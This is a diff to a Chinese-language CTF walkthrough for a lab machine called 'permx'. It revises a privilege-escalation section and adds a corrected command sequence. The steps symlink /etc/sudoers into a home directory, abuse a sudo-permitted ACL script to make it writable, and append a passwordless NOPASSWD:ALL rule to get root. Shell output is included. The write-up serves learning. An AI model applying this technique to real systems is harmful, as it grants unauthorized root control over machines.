@@ -192,17 +192,46 @@ fi
 
 #### 总之，该脚本修改指定文件的访问控制列表ACL/home/mtz/目录，允许指定的用户具有特定的权限（例如读取或读取）在那个文件上写。我们可以利用这一点，通过首先使用创建一个符号链接来获得一个root shell下面的命令使用ln和-s标志。这将创建一个名为root in的符号链接指向/etc/sudoers文件的MTZ主目录。
 ```
-mtz@permx:~$ ln -s /etc/sudoers /home/mtz/root
+mtz@permx:~$ ln -s /etc/sudoers 
 ```
 #### 然后，我们继续使用acl.sh脚本为链接的文件授予读写权限。通过使用下面的命令执行脚本，我们指定了用户mtz、权限rw、目标文件，就是我们刚刚创建的符号链接。
 ```
-mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
 Target must be a file.
 ```
 #### 接下来，我们通过符号链接向/etc/sudoers文件添加一行，以允许mtz用户执行以下操作使用以下命令以root身份执行任意命令，无需密码。
 ```
-mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD:ALL" >> /home/mtz/root
+mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD:ALL" >> /home/mtz/sudoers
 ```
 #### 最后，我们可以运行sudo bash以root身份获得一个shell，这将为我们提供升级的shell特权，允许我们以root用户的身份执行任何命令。
+
+### 正解
+```
+mtz@permx:~$ ls
+user.txt
+mtz@permx:~$ ln -s /etc/sudoers
+mtz@permx:~$ ls 
+sudoers  user.txt
+mtz@permx:~$ cat sudoers
+cat: sudoers: Permission denied
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
+mtz@permx:~$ ls
+sudoers  user.txt
+mtz@permx:~$ cat sudoers
+<SNIP>
+mtz ALL=(ALL:ALL) NOPASSWD: /opt/acl.sh
+
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/sudoers
+mtz@permx:~$ getfacl /home/mtz/sudoers
+getfacl: Removing leading '/' from absolute path names
+# file: home/mtz/sudoers
+# owner: mtz
+# group: mtz
+user::rw-
+user:mtz:rwx
+group::rw-
+mask::rwx
+other::r--
+
 
 
